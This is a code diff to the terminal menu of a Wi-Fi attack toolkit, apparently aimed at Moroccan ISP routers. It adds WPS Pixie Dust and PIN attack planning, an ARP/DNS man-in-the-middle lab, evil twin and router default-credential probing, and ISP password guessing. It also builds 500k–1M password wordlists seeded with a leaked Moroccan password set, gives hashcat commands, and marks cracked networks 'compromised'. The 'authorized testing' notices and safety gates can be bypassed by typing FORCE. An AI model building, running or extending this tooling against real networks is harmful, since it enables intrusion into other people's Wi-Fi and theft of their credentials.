@@ -35,14 +35,19 @@ sys.path.insert(0, str(Path(__file__).parent))
 from config import Config
 from database import Database
 from modules.scanner import scan_iw, get_interface_mode, get_interfaces
-from modules.wps_pins import classify_model_vulnerability, suggest_pins
+from modules.wps_pins import classify_model_vulnerability, classify_pixie_resistance, suggest_pins
 from modules.attack import run_wps_attack, analyze_target, run_smart_attack
-from modules.target_assessment import TargetAssessor
+from modules.target_assessment import TargetAssessor, history_from_db
+from modules.safety_gates import gate_online_wps, evaluate_signal
+from modules.playbooks import build_playbook
+from modules.isp_passwords import candidates_for_target, format_candidates
+from modules.evidence import write_attack_evidence, write_lab_note_md
+
 from modules.monitor_mode import (
     get_mode, enable_monitor, disable_monitor, set_channel,
     kill_processes, get_iw_dev, iface_up, iface_down
 )
-from modules.reports import generate_html, export_json
+from modules.reports import generate_html, export_json, export_diagnostics_json
 from modules.wpa_supplicant import WpaSupplicant
 from modules.wpa_engine import WpsEngine
 from modules.auto_wps import AutoWPS
@@ -53,7 +58,9 @@ from modules.passive_capture import PassiveHandshakeCapture
 from modules.hashcat_runner import HashcatRunner
 from modules.recon import NetworkRecon
 from modules.evil_twin import EvilTwin, cleanup_portal
-from modules.wpa2_evil_twin import Wpa2EvilTwin
+from modules.lan_mitm import LanMitmLab, detect_tools, install_hints, is_private_ipv4, is_valid_ipv4
+from modules.diagnostics import run_diagnostics, format_summary
+from modules.wps_pins import get_pin_database_info, get_vulnerability_pattern_stats
 
 THEME = {
     "ok": "bold green", "err": "bold red", "warn": "bold yellow",
@@ -124,12 +131,29 @@ def _credential_fields_for_result(result):
 
 
 def _print_attack_result(result):
-    """Display only verified credentials, never attempted PINs."""
+    """Display verified credentials; also surface unverified Pixie PIN."""
     verified_pin, verified_psk = _credential_fields_for_result(result)
     if verified_pin:
         con.print("\n[ok]PIN VERIFIED: {value}[/]".format(value=verified_pin))
     if verified_psk:
         con.print("[ok]PSK FOUND: {value}[/]".format(value=verified_psk))
+
+    if not isinstance(result, dict):
+        return
+    status = result.get("status")
+    if status == "pixie_pin_unverified":
+        pin = result.get("pin") or result.get("pixie_pin") or result.get("attempted_pin")
+        if pin:
+            con.print("\n[warn]PIXIE PIN (offline, PSK not verified yet): {value}[/]".format(
+                value=pin
+            ))
+            con.print(
+                "[dim]Retry Attack Center → PIN Attack with this PIN when signal is stronger.[/]"
+            )
+    elif status == "pixie_not_vulnerable":
+        con.print("\n[err]Pixie: AP not vulnerable (full data, no PIN).[/]")
+    elif status and status not in ("success", "completed") and not verified_psk:
+        con.print("\n[dim]Result status: {st}[/]".format(st=status))
 
 
 def _vulnerability_label(model, device):
@@ -202,9 +226,11 @@ class App:
                     ("7","Router Exploiter"), ("8","Wordlist Generator"),
                     ("9","Handshake Capture"), ("10","Hashcat Cracker"),
                     ("11","Network Recon"), ("12","Evil Twin"),
-                    ("13","WPA2 Evil Twin"), ("14","Live Monitor"),
+                    ("13","LAN MITM Lab (ARP/DNS)"), ("14","Live Monitor"),
                     ("15","Credentials Vault"), ("16","Reports"),
-                    ("17","Device Info"), ("A","Settings"),
+                    ("17","Device Info"), ("18","System Diagnostics"),
+                    ("19","Candidate PIN Vault"), ("20","First-Target Wizard"),
+                    ("A","Settings"),
                     ("0","Exit"),
                 ]
                 for n, m in items:
@@ -212,7 +238,7 @@ class App:
                 con.print(Panel(menu, border_style="cyan", padding=(1,2)))
 
                 ch = Prompt.ask("[hdr]Select[/]",
-                               choices=["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","a","A"],
+                               choices=["0","1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","a","A"],
                                default="1")
                 actions = {
                     "1": self.view_scanner, "2": self.view_targets,
@@ -221,9 +247,10 @@ class App:
                     "7": self.view_router_exploit, "8": self.view_wordlist,
                     "9": self.view_handshake, "10": self.view_hashcat,
                     "11": self.view_recon, "12": self.view_evil_twin,
-                    "13": self.view_wpa2_evil_twin, "14": self.view_live,
+                    "13": self.view_lan_mitm, "14": self.view_live,
                     "15": self.view_creds, "16": self.view_reports,
-                    "17": self.view_device,
+                    "17": self.view_device, "18": self.view_diagnostics,
+                    "19": self.view_candidate_pins, "20": self.view_first_target_wizard,
                     "a": self.view_settings, "A": self.view_settings,
                 }
                 if ch == "0":
@@ -244,12 +271,60 @@ class App:
         banner()
         if os.getuid() != 0:
             con.print("[warn]Not root! Some features may not work.[/]")
-            time.sleep(2)
+            time.sleep(1)
 
         con.print("[ok]Using built-in WPS Engine (WpsEngine)[/]")
 
-        self.db.log("startup", "system", "WPS Toolkit started")
-        time.sleep(1)
+        # Offline intelligence status — critical for beginners
+        pin_info = get_pin_database_info()
+        pin_version = pin_info.get("database_version", "unavailable")
+        pin_prefixes = pin_info.get("prefix_count", 0)
+        pin_pins = pin_info.get("pin_count", 0)
+        if pin_version in ("unavailable", "unknown") or not pin_prefixes:
+            con.print(
+                "[err]WPS PIN intelligence missing/empty.[/] "
+                "Run: [inf]python3 tools/build_pin_database.py --merge-static[/]"
+            )
+        else:
+            con.print(
+                "[ok]PIN intelligence:[/] {ver} "
+                "([inf]{prefixes}[/] prefixes / [inf]{pins}[/] pins)".format(
+                    ver=pin_version,
+                    prefixes=pin_prefixes,
+                    pins=pin_pins,
+                )
+            )
+
+        try:
+            vuln_stats = get_vulnerability_pattern_stats()
+            con.print(
+                "[ok]Model patterns:[/] {known} known / {heur} heuristic".format(
+                    known=vuln_stats.get("known_vulnerable_patterns", 0),
+                    heur=vuln_stats.get("vendor_heuristic_patterns", 0),
+                )
+            )
+        except Exception:
+            pass
+
+        iface = self.cfg.get("interface", "wlan0")
+        con.print("[dim]Interface: {iface} | data: {db}[/]".format(
+            iface=iface,
+            db=str(Path(__file__).parent / "data"),
+        ))
+        con.print(
+            "[dim]Tip: menu 18 = System Diagnostics | "
+            "Authorized testing only[/]"
+        )
+
+        self.db.log(
+            "startup",
+            "system",
+            "WPS Toolkit started pin_db={ver} prefixes={p}".format(
+                ver=pin_version,
+                p=pin_prefixes,
+            ),
+        )
+        time.sleep(1.5)
 
     def _exit(self):
         con.print("\n[hdr]Shutting down...[/]")
@@ -392,12 +467,101 @@ class App:
                     con.print("[warn]No targets.[/]")
                 Prompt.ask("\n[dim]Enter[/]")
             elif ch == "3":
-                q = Prompt.ask("Search")
-                res = self.db.search_networks(q)
-                if res:
-                    net_table(res, f"'{q}' ({len(res)})")
-                else:
-                    con.print("[warn]No results.[/]")
+                essid = Prompt.ask("ESSID")
+                gen = WordlistGenerator()
+                words = gen.generate_from_essid(essid)
+                con.print("\n[ok]{n} passwords:[/]".format(n=len(words)))
+                for w in words[:30]:
+                    con.print("  {w}".format(w=w))
+                if len(words) > 30:
+                    con.print("  ... +{n} more".format(n=len(words) - 30))
+                Prompt.ask("\n[dim]Enter[/]")
+
+            elif ch == "4":
+                con.print(
+                    "[ok]Realistic Morocco wordlist: 500,000 passwords\n"
+                    "Length 8–12 balanced · MoroccanRockyou + ISP/names · no random spam[/]"
+                )
+                essid = Prompt.ask("Seed ESSID", default="Wifi_Maroc_Home_2026")
+                brand = Prompt.ask("Seed brand/ISP", default="inwi")
+                model = Prompt.ask("Seed model", default="HG6145F1")
+                count = IntPrompt.ask("Count", default=500000)
+                out = Prompt.ask(
+                    "Output file",
+                    default=str(Path("data/wordlists/realistic_ma_500k_2026.txt")),
+                )
+                if not Confirm.ask("Start generation?", default=True):
+                    continue
+                with con.status("[ok]Building realistic list...[/]", spinner="dots"):
+                    import subprocess, sys as _sys
+                    script = Path(__file__).parent / "tools" / "build_realistic_wordlist.py"
+                    try:
+                        r = subprocess.run(
+                            [
+                                _sys.executable, str(script),
+                                "--count", str(count),
+                                "--output", out,
+                                "--essid", essid,
+                                "--brand", brand,
+                                "--model", model,
+                            ],
+                            capture_output=True,
+                            text=True,
+                            timeout=1800,
+                            cwd=str(Path(__file__).parent),
+                        )
+                        if r.stdout:
+                            con.print(r.stdout[-1200:])
+                        if r.returncode != 0:
+                            con.print("[err]{e}[/]".format(e=(r.stderr or "failed")[-500:]))
+                        elif Path(out).exists():
+                            n = sum(1 for _ in open(out, "rb"))
+                            size = Path(out).stat().st_size
+                            con.print(
+                                "[ok]Saved {n} passwords → {p} ({mb:.1f} MB)[/]".format(
+                                    n=n, p=out, mb=size/(1024*1024.0)
+                                )
+                            )
+                    except Exception as exc:
+                        con.print("[err]{e}[/]".format(e=exc))
+                con.print(
+                    "[dim]hashcat -m 22000 capture.hc22000 {p}[/]".format(p=out)
+                )
+                con.print(
+                    "[dim]Seeds: MoroccanRockyou + ISP/local patterns (8–12 only)[/]"
+                )
+                Prompt.ask("\n[dim]Enter[/]")
+
+            elif ch == "5":
+                con.print(
+                    "[warn]Quick 1,000,000 pack (no full MoroccanRockyou merge path).[/]"
+                )
+                essid = Prompt.ask("Seed ESSID", default="Wifi_Maroc_Home_2026")
+                count = IntPrompt.ask("Count", default=1000000)
+                out = Prompt.ask(
+                    "Output file",
+                    default=str(Path("data/wordlists/mega_1m_2026.txt")),
+                )
+                if not Confirm.ask("Start?", default=True):
+                    continue
+                with con.status("[ok]Generating...[/]", spinner="dots"):
+                    gen = WordlistGenerator()
+                    words = gen.generate_mega(max_words=count, essid=essid, brand="inwi")
+                    n = gen.save_list(words, out)
+                con.print("[ok]Saved {n} → {p}[/]".format(n=n, p=out))
+                Prompt.ask("\n[dim]Enter[/]")
+
+            elif ch == "6":
+                con.print(
+                    "[inf]CLI:[/]\n"
+                    "  python3 tools/build_mega_wordlist.py --count 5000000\n"
+                    "  python3 tools/build_mega_wordlist.py --essid Fibre_inwi_2.4G_5807\n"
+                    "Output: data/wordlists/mega_ma_5m_2026.txt\n\n"
+                    "[inf]Seeds:[/]\n"
+                    "  • MoroccanRockyou (ydy4) — leaked/research MA passwords\n"
+                    "  • Local ISP/name/city/phone/2026 smart patterns\n"
+                    "Authorized testing / password hygiene only."
+                )
                 Prompt.ask("\n[dim]Enter[/]")
             elif ch == "4":
                 b = Prompt.ask("BSSID").strip().upper()
@@ -594,9 +758,11 @@ class App:
                 "wps_device": "",
             }
 
+        hist = history_from_db(self.db, bssid)
         assessor = TargetAssessor(
             internal_monitor=True,
             internal_injection=False,
+            history=hist,
         )
         report = assessor.assess(network)
         assessment_id = self.db.save_assessment(report)
@@ -610,12 +776,21 @@ class App:
             grade=report["signal_grade"],
         ))
         con.print("  Encryption:  {value}".format(value=report["encryption"]))
+        con.print("  WPS version: {value}".format(value=report.get("wps_version") or "?"))
         con.print("  Manufacturer:{value}".format(value=report["manufacturer"]))
         con.print("  Model:       {value}".format(value=report["model"] or "Unknown"))
+        if report.get("isp_essid"):
+            con.print("  [warn]ISP/fibre ESSID pattern detected[/]")
 
         con.print("\n[hdr]Capability Matrix[/]")
         wps_state = "Yes" if report["has_wps"] else "No"
-        pixie_state = "Candidate" if report["pixie_candidate"] else "No"
+        if report.get("pixie_candidate"):
+            pixie_state = "{tier} ({conf}%)".format(
+                tier=str(report.get("pixie_tier") or "yes").upper(),
+                conf=report.get("pixie_confidence", 0),
+            )
+        else:
+            pixie_state = "No ({conf}%)".format(conf=report.get("pixie_confidence", 0))
         pmkid_state = "Candidate" if report["pmkid_candidate"] else "No"
         passive_state = "Candidate" if report["passive_candidate"] else "No"
         con.print("  WPS detected:       {value} (Lock: {lock})".format(
@@ -625,10 +800,24 @@ class App:
         con.print("  Known OUI PINs:     {value}".format(
             value=report["known_pin_count"]
         ))
+        con.print("  PIN path conf:      {value}% — {reason}".format(
+            value=report.get("pin_path_confidence", 0),
+            reason=report.get("pin_path_reason", ""),
+        ))
+        con.print("  Max online PINs:    {value} (budget)".format(
+            value=report.get("max_online_pins", 3)
+        ))
         con.print("  Pixie Dust:         {value}".format(value=pixie_state))
         con.print("  Managed PMKID:      {value}".format(value=pmkid_state))
         con.print("  Passive handshake:  {value}".format(value=passive_state))
         con.print("  Internal injection: No (QCACLD receive-only)")
+        if report.get("pixie_reasons"):
+            con.print("\n[hdr]Pixie reasoning[/]")
+            for reason in report.get("pixie_reasons")[:6]:
+                con.print("  [dim]• {r}[/]".format(r=reason))
+        if report.get("attack_order"):
+            con.print("\n[hdr]Suggested order[/]")
+            con.print("  {order}".format(order=" → ".join(report["attack_order"][:6])))
 
         con.print("\n[hdr]Intelligence Database[/]")
         con.print("  Version:  [inf]{value}[/]".format(
@@ -667,29 +856,48 @@ class App:
         actions = {}
         next_number = 1
         con.print("\n[hdr]Available Authorized Next Actions[/]")
-        if report["pmkid_candidate"]:
-            actions[str(next_number)] = "pmkid"
-            con.print("  [mn]{number}[/] Managed PMKID probe".format(
-                number=next_number
-            ))
-            next_number += 1
-        if report["passive_candidate"]:
-            actions[str(next_number)] = "passive"
-            con.print("  [mn]{number}[/] Passive handshake wait".format(
-                number=next_number
-            ))
-            next_number += 1
-        if report["has_wps"] and report["wps_locked"].lower() != "yes":
-            actions[str(next_number)] = "pin_sweep"
-            con.print("  [mn]{number}[/] Suggested PIN Sweep".format(
-                number=next_number
-            ))
-            next_number += 1
-            actions[str(next_number)] = "pixie"
-            con.print("  [mn]{number}[/] Pixie Dust probe".format(
-                number=next_number
-            ))
-            next_number += 1
+        # Offer actions following attack_order preference
+        offered = set()
+        for method in report.get("attack_order") or []:
+            if method in ("known_pin_sweep", "calculated_pin_sweep") and "pin_sweep" not in offered:
+                if report["has_wps"] and report["wps_locked"].lower() != "yes":
+                    actions[str(next_number)] = "pin_sweep"
+                    con.print("  [mn]{number}[/] Suggested PIN Sweep (budget {n})".format(
+                        number=next_number,
+                        n=report.get("max_online_pins", 3),
+                    ))
+                    next_number += 1
+                    offered.add("pin_sweep")
+            elif method == "managed_pmkid_probe" and report["pmkid_candidate"] and "pmkid" not in offered:
+                actions[str(next_number)] = "pmkid"
+                con.print("  [mn]{number}[/] Managed PMKID probe".format(number=next_number))
+                next_number += 1
+                offered.add("pmkid")
+            elif method == "passive_handshake_wait" and report["passive_candidate"] and "passive" not in offered:
+                actions[str(next_number)] = "passive"
+                con.print("  [mn]{number}[/] Passive handshake wait".format(number=next_number))
+                next_number += 1
+                offered.add("passive")
+            elif method in ("pixie_probe", "pixie_probe_last_resort") and report.get("pixie_candidate") and "pixie" not in offered:
+                label = "Pixie Dust probe"
+                if report.get("pixie_tier") == "low":
+                    label = "Pixie Dust (LAST RESORT, conf {c}%)".format(
+                        c=report.get("pixie_confidence", 0)
+                    )
+                elif report.get("pixie_tier") == "high":
+                    label = "Pixie Dust (HIGH conf {c}%)".format(
+                        c=report.get("pixie_confidence", 0)
+                    )
+                else:
+                    label = "Pixie Dust (conf {c}%)".format(
+                        c=report.get("pixie_confidence", 0)
+                    )
+                actions[str(next_number)] = "pixie"
+                con.print("  [mn]{number}[/] {label}".format(
+                    number=next_number, label=label
+                ))
+                next_number += 1
+                offered.add("pixie")
         con.print("  [mn]0[/] Back")
 
         if not actions:
@@ -938,6 +1146,12 @@ class App:
         )
 
         _print_attack_result(result)
+        if hasattr(self, "_save_attack_artifacts"):
+            self._save_attack_artifacts(
+                bssid, essid, atype if "atype" in locals() else "attack", result,
+                assessment=assess_report if "assess_report" in locals() else None,
+                playbook=playbook if "playbook" in locals() else None,
+            )
 
         if result["status"] == "success" and verified_psk:
             self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
@@ -983,6 +1197,39 @@ class App:
             essid = Prompt.ask("ESSID", default="Unknown")
             channel = IntPrompt.ask("Channel", default=0)
             return bssid, essid, channel
+
+
+    def _save_attack_artifacts(self, bssid, essid, action, result, assessment=None, playbook=None):
+        """Store candidate PIN + evidence JSON + lab note."""
+        try:
+            st = result.get("status") if isinstance(result, dict) else ""
+            if st == "pixie_pin_unverified":
+                cpin = result.get("pin") or result.get("pixie_pin") or result.get("attempted_pin")
+                if cpin:
+                    self.db.save_candidate_pin(
+                        bssid, cpin, essid=essid, source="pixie_offline",
+                        confidence=85, notes="PSK not verified yet",
+                    )
+                    con.print("[ok]Candidate PIN stored (unverified).[/]")
+            elif st == "success" and result.get("pin") and result.get("psk"):
+                try:
+                    self.db.mark_candidate_verified(bssid, result.get("pin"), result.get("psk"))
+                except Exception:
+                    pass
+            ev = write_attack_evidence(
+                bssid, essid, action, result=result,
+                assessment=assessment, playbook=playbook,
+            )
+            try:
+                self.db.save_evidence_index(bssid, essid, action, st, ev)
+            except Exception:
+                pass
+            note = write_lab_note_md(ev)
+            if note:
+                con.print("[dim]Lab note: {p}[/]".format(p=note))
+            con.print("[dim]Evidence: {p}[/]".format(p=ev))
+        except Exception as exc:
+            con.print("[dim]Evidence save skipped: {e}[/]".format(e=str(exc)))
 
     def _launch_attack(self, ch, preset_target=None):
         con.clear()
@@ -1118,15 +1365,79 @@ class App:
             if pins:
                 con.print("  [ok]Suggested PINs:[/]")
                 for index, pin_info in enumerate(pins[:6], 1):
-                    con.print("    {index}. [ok]{pin}[/] ({method})".format(
+                    conf = pin_info.get("confidence", "?")
+                    con.print("    {index}. [ok]{pin}[/] ({method}, conf {conf})".format(
                         index=index,
                         pin=pin_info["pin"],
                         method=pin_info["method"],
+                        conf=conf,
                     ))
         else:
             pins = suggest_pins(bssid)[:5]
             signal = 0
             wps_locked = "Unknown"
+            model = ""
+            device = ""
+            wps_version = ""
+            has_wps = 1
+
+        # Offline smart assessment (history-aware) for method gating
+        assess_net = {
+            "bssid": bssid,
+            "essid": essid,
+            "channel": channel,
+            "rssi": int(signal or 0),
+            "has_wps": int(has_wps or 0) if n else 1,
+            "wps_locked": str(wps_locked or "Unknown"),
+            "wps_version": str(wps_version or "") if n else "",
+            "wps_model": str(model or ""),
+            "wps_device": str(device or ""),
+            "encryption": str(_get_field(n, "encryption", "WPA2") or "WPA2") if n else "WPA2",
+        }
+        hist = history_from_db(self.db, bssid)
+        assess_report = TargetAssessor(
+            internal_monitor=True,
+            internal_injection=False,
+            history=hist,
+        ).assess(assess_net)
+
+        playbook = assess_report.get("playbook") or build_playbook(assess_net, assess_report)
+        con.print("\n  [hdr]Method planner[/]")
+        con.print("  Recommended: [ok]{v}[/]".format(v=assess_report.get("recommended_method")))
+        con.print("  Playbook:    [inf]{v}[/]".format(v=playbook.get("label") or playbook.get("family")))
+        con.print("  Primary:     {v}".format(v=playbook.get("primary")))
+        con.print("  Pixie: {tier} ({conf}%)  allowed={al}".format(
+            tier=str(assess_report.get("pixie_tier") or "none").upper(),
+            conf=assess_report.get("pixie_confidence", 0),
+            al=playbook.get("pixie_allowed"),
+        ))
+        if assess_report.get("modern_resistant"):
+            con.print("  [warn]Modern ISP ONT: {m} — Pixie not recommended[/]".format(
+                m=assess_report.get("resistant_match") or "?"
+            ))
+        if assess_report.get("attack_order"):
+            con.print("  Order: {o}".format(
+                o=" → ".join(assess_report.get("attack_order")[:5])
+            ))
+        for note in (playbook.get("notes") or [])[:2]:
+            con.print("  [dim]• {n}[/]".format(n=note))
+        for warn in (playbook.get("warnings") or [])[:2]:
+            con.print("  [warn]• {w}[/]".format(w=warn))
+
+        # ISP password candidates (offline)
+        if playbook.get("family") in ("isp_ont", "isp_generic", "zte_cpe", "huawei_cpe"):
+            cands = candidates_for_target(
+                essid=essid,
+                bssid=bssid,
+                model=str(assess_net.get("wps_model") or ""),
+                manufacturer=str(assess_report.get("manufacturer") or ""),
+                limit=10,
+            )
+            if cands:
+                con.print("\n  [hdr]Offline ISP password candidates[/]")
+                for line in format_candidates(cands, limit=8):
+                    con.print("    {l}".format(l=line))
+                con.print("  [dim]Heuristics only — not verified. Try via connection test / hashcat offline.[/]")
 
         # Attack type. Menu 4 is always a specific PIN; menu 5 uses the
         # smart best-PIN path for a saved target.
@@ -1137,6 +1448,37 @@ class App:
             "5": "smart",
         }
         atype = atype_map.get(ch, "pixie")
+
+        # Hard safety gates (signal / lock / pixie history / planner)
+        gate = gate_online_wps(
+            rssi=assess_net.get("rssi") or signal,
+            wps_locked=assess_net.get("wps_locked") or wps_locked,
+            has_wps=bool(int(assess_net.get("has_wps") or has_wps or 0)),
+            action=atype,
+            history=hist,
+            modern_resistant=bool(assess_report.get("modern_resistant")),
+            pixie_tier=str(assess_report.get("pixie_tier") or "none"),
+        )
+        con.print("\n  [hdr]Safety gate[/]")
+        con.print("  {sum}".format(sum=gate.get("summary")))
+        for reason in (gate.get("reasons") or [])[:4]:
+            style = "warn" if (not gate.get("allowed") or gate.get("force_required")) else "dim"
+            con.print("  [{s}]• {r}[/]".format(s=style, r=reason))
+        if atype == "pixie" and not gate.get("allowed"):
+            con.print("[ok]Better path:[/] {rec}".format(
+                rec=assess_report.get("recommended_method")
+            ))
+        if not gate.get("allowed") or (gate.get("force_required") and atype in ("pixie", "bruteforce", "pin", "smart")):
+            if not Confirm.ask(
+                "Force this online action despite warnings?",
+                default=False,
+            ):
+                return
+            if self.cfg.get("require_force_phrase", True) and not gate.get("allowed"):
+                phrase = Prompt.ask("Type FORCE to continue", default="")
+                if str(phrase).strip().upper() != "FORCE":
+                    con.print("[err]Cancelled — FORCE not confirmed.[/]")
+                    return
 
         pin = None
         if atype == "pin":
@@ -1171,12 +1513,14 @@ class App:
             iface=attack_iface
         ))
         if atype == "bruteforce":
+            max_pins = int(assess_report.get("max_online_pins") or 3)
             con.print(
-                "[warn]Controlled mode: tries only high-priority calculated/default "
-                "PINs. It is not an exhaustive 11,000-PIN attack.[/]"
+                "[warn]Controlled mode: high-priority PINs only "
+                "(budget ~{n}). Not an exhaustive 11k attack.[/]".format(n=max_pins)
             )
 
-        if not Confirm.ask("\n  Start authorized test?", default=True):
+        _def_confirm = not (not gate.get("allowed") or gate.get("force_required") or (atype == "pixie" and str(assess_report.get("pixie_tier")) in ("none", "low")))
+        if not Confirm.ask("\n  Start authorized test?", default=_def_confirm):
             return
 
         # Create session
@@ -1239,6 +1583,12 @@ class App:
         )
 
         _print_attack_result(result)
+        if hasattr(self, "_save_attack_artifacts"):
+            self._save_attack_artifacts(
+                bssid, essid, atype if "atype" in locals() else "attack", result,
+                assessment=assess_report if "assess_report" in locals() else None,
+                playbook=playbook if "playbook" in locals() else None,
+            )
 
         if result["status"] == "success" and verified_psk:
             self.db.execute("UPDATE networks SET status='compromised' WHERE bssid=?", (bssid,))
@@ -1445,33 +1795,61 @@ class App:
             con.clear()
             con.print(Rule("[hdr]Reports & Statistics[/]", style="cyan"))
             con.print("\n  [mn]1[/] Overview  [mn]2[/] HTML Report  [mn]3[/] Export JSON")
-            con.print("  [mn]4[/] Backup DB  [mn]0[/] Back\n")
+            con.print("  [mn]4[/] Backup DB  [mn]5[/] Recent Activity  [mn]0[/] Back\n")
 
             ch = Prompt.ask("Select", default="0")
             if ch == "0":
                 break
             elif ch == "1":
                 st = self.db.get_stats()
-                t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+                intel = self.db.get_intelligence_stats()
+                t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
                 t.add_column("Metric", style="dim")
                 t.add_column("Value", style="bold cyan")
                 for k, v in st.items():
                     t.add_row(k, str(v))
+                t.add_row("pin_db_version", str(intel.get("version", "unavailable")))
+                t.add_row("pin_db_prefixes", str(intel.get("prefixes", 0)))
+                t.add_row("pin_db_pins", str(intel.get("pins", 0)))
+                try:
+                    suspicious = self.db.get_suspicious_wps_credentials()
+                    t.add_row("suspicious_wps_rows", str(len(suspicious)))
+                except Exception:
+                    pass
                 con.print(Panel(t, title="Overview", border_style="cyan"))
                 Prompt.ask("\n[dim]Enter[/]")
             elif ch == "2":
                 with con.status("[ok]Generating...", spinner="dots"):
                     p = generate_html(self.db)
-                con.print(f"[ok]Saved: {p}[/]")
+                con.print("[ok]Saved: {path}[/]".format(path=p))
                 Prompt.ask("\n[dim]Enter[/]")
             elif ch == "3":
                 with con.status("[ok]Exporting...", spinner="dots"):
                     p = export_json(self.db)
-                con.print(f"[ok]Saved: {p}[/]")
+                con.print("[ok]Saved: {path}[/]".format(path=p))
                 Prompt.ask("\n[dim]Enter[/]")
             elif ch == "4":
                 p = self.db.backup()
-                con.print(f"[ok]Backup: {p}[/]")
+                con.print("[ok]Backup: {path}[/]".format(path=p))
+                Prompt.ask("\n[dim]Enter[/]")
+            elif ch == "5":
+                rows = self.db.get_activity_summary(30)
+                if not rows:
+                    con.print("[warn]No activity logged yet.[/]")
+                else:
+                    t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
+                    t.add_column("Time", min_width=16)
+                    t.add_column("Type")
+                    t.add_column("Cat")
+                    t.add_column("Msg")
+                    for row in rows:
+                        t.add_row(
+                            str(row["timestamp"])[:19],
+                            str(row["event_type"] or ""),
+                            str(row["category"] or ""),
+                            str(row["message"] or "")[:60],
+                        )
+                    con.print(t)
                 Prompt.ask("\n[dim]Enter[/]")
 
     # ═══════════════════════════════════════
@@ -1481,7 +1859,7 @@ class App:
         con.clear()
         con.print(Rule("[hdr]Device Info[/]", style="cyan"))
 
-        t = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
+        t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
         t.add_column("Key", style="dim", min_width=18)
         t.add_column("Value", style="cyan")
         t.add_row("Architecture", os.uname().machine)
@@ -1491,20 +1869,133 @@ class App:
 
         ifaces = get_interfaces()
         t.add_row("Interfaces", ", ".join(ifaces) if ifaces else "None")
+        t.add_row("Configured IF", str(self.cfg.get("interface", "wlan0")))
 
-        tools = ["iw","airmon-ng","airodump-ng","wash","reaver",
-                "pixiewps","wpa_cli","macchanger","mdk4"]
+        tools = [
+            "iw", "ip", "wpa_supplicant", "wpa_cli", "airmon-ng",
+            "airodump-ng", "wash", "reaver", "pixiewps", "hashcat",
+            "hostapd", "dnsmasq", "macchanger", "tcpdump",
+        ]
         inst = sum(1 for tool in tools if shutil.which(tool))
-        t.add_row("Tools", f"{inst}/{len(tools)}")
+        t.add_row("Tools", "{have}/{total}".format(have=inst, total=len(tools)))
+
+        pin_info = get_pin_database_info()
+        t.add_row(
+            "PIN DB",
+            "{ver} ({p} prefixes)".format(
+                ver=pin_info.get("database_version", "unavailable"),
+                p=pin_info.get("prefix_count", 0),
+            ),
+        )
 
         con.print(Panel(t, title="Device", border_style="cyan"))
 
         con.print("\n[inf]Tools:[/]")
         for tool in tools:
             icon = "[ok]V[/]" if shutil.which(tool) else "[err]X[/]"
-            con.print(f"  {icon} {tool}")
+            con.print("  {icon} {tool}".format(icon=icon, tool=tool))
 
+        con.print(
+            "\n[dim]For a full health check use menu 18 "
+            "(System Diagnostics).[/]"
+        )
         Prompt.ask("\n[dim]Enter[/]")
+
+    def view_diagnostics(self):
+        """Offline system health / readiness check for beginners."""
+        while True:
+            con.clear()
+            con.print(Rule("[hdr]System Diagnostics[/]", style="cyan"))
+            con.print(
+                "[dim]Offline checks only — no attack traffic is sent.[/]\n"
+            )
+
+            with con.status("[ok]Running diagnostics...[/]", spinner="dots"):
+                report = run_diagnostics(
+                    db=self.db,
+                    interface=self.cfg.get("interface", "wlan0"),
+                )
+
+            overall = report.get("overall", "unknown")
+            style = {
+                "ok": "ok",
+                "warn": "warn",
+                "error": "err",
+            }.get(overall, "inf")
+            con.print(Panel(
+                "[{style}]{summary}[/]".format(
+                    style=style,
+                    summary=format_summary(report),
+                ),
+                border_style="cyan",
+                title="Summary",
+            ))
+
+            # Core tools
+            t = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan",
+                      title="[hdr]Core Tools[/]")
+            t.add_column("Tool", min_width=14)
+            t.add_column("Status", justify="center")
+            t.add_column("Path")
+            for tool in report.get("core_tools", []):
+                if tool.get("installed"):
+                    status = "[ok]OK[/]"
+                else:
+                    status = "[err]MISSING[/]"
+                t.add_row(tool.get("name", "?"), status, tool.get("path", "") or "-")
+            con.print(t)
+
+            # Interfaces
+            ifaces = report.get("interfaces") or []
+            if ifaces:
+                ti = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan",
+                           title="[hdr]Wireless Interfaces[/]")
+                ti.add_column("Interface")
+                ti.add_column("Mode")
+                for item in ifaces:
+                    ti.add_row(item.get("name", "?"), item.get("mode", "?"))
+                con.print(ti)
+            else:
+                con.print("[warn]No wireless interfaces detected via iw.[/]")
+
+            # PIN intelligence
+            pin = report.get("pin_database") or {}
+            con.print(Panel(
+                "Status: [{s}]{status}[/]\n"
+                "Version: {ver}\n"
+                "Prefixes / PINs: {pref} / {pins}\n"
+                "Path: {path}".format(
+                    s="ok" if pin.get("status") == "ok" else "warn",
+                    status=pin.get("status", "?"),
+                    ver=pin.get("version", "?"),
+                    pref=pin.get("prefixes", 0),
+                    pins=pin.get("pins", 0),
+                    path=pin.get("path", "?"),
+                ),
+                title="PIN Intelligence",
+                border_style="cyan",
+            ))
+
+            for warn in report.get("warnings") or []:
+                con.print("[warn]! {msg}[/]".format(msg=warn))
+            for err in report.get("errors") or []:
+                con.print("[err]X {msg}[/]".format(msg=err))
+
+            con.print(
+                "\n  [mn]1[/] Re-run  [mn]2[/] Export JSON  [mn]0[/] Back\n"
+            )
+            ch = Prompt.ask("Select", default="0")
+            if ch == "0":
+                break
+            if ch == "2":
+                path = export_diagnostics_json(report)
+                con.print("[ok]Saved: {path}[/]".format(path=path))
+                self.db.log(
+                    "diagnostics_export",
+                    "system",
+                    "Exported diagnostics to {path}".format(path=path),
+                )
+                Prompt.ask("\n[dim]Enter[/]")
 
     # ═══════════════════════════════════════
     # VIEW: SETTINGS
@@ -2071,92 +2562,592 @@ class App:
     # VIEW: ROUTER EXPLOITER
     # ═══════════════════════════════════════
     def view_router_exploit(self):
-        """Router web interface exploitation"""
+        """Router web audit — ports, fingerprint, optional default Basic Auth."""
+        from modules.router_exploit import (
+            RouterExploiter,
+            build_cred_list,
+            get_router_ip,
+            validate_target_ip,
+        )
+        from modules.smart_probe import SmartProbeAdvisor, policy_for_brand
